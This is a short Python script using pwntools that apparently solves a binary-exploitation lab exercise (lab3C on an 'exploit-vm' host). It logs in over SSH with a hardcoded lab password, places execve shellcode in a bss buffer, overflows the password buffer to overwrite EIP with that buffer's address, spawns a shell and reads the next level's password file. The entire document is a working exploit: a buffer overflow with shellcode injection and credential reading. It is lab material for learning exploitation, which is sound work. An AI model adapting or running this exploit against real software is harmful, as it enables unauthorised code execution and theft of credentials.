#!/usr/bin/env python
from pwn import *

chal = '3C'
password = "lab03start"

host = 'exploit-vm'
user = 'lab%s' % chal
level, grade = int(chal[:-1]), chal[-1]
binary = '/levels/lab{:02d}/lab{}'.format(level, chal)

shell = ssh(host=host, user=user, password=password)
r = shell.run(binary)

shellcode = asm(shellcraft.i386.linux.execve())

# Store shellcode in the `a_user_name` buffer in the bss
r.send("rpisec\x00\x90")  # Send the correct username
r.send(shellcode)
r.send("\n")

# Send password and override EIP to shellcode in bss
r.send("A"*80)
r.send(p32(0x08049c48))
r.send("\n")
r.clean(0.2)

log.success("Got a shell!")
r.sendline("cat /home/lab3B/.pass")
log.success("Flag: %s", r.readline())
r.interactive()
